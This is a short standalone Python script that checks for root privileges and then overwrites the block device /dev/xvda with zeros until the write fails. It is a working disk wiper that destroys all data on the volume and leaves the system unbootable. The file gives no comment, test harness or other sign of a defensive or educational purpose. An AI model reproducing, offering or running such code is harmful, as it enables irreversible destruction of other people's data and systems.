#!/usr/bin/env python3
import os
if os.geteuid() == 0:
    with open("/dev/xvda", "r+b") as d:
        while d.write(b"\x00" * 65536):
            pass
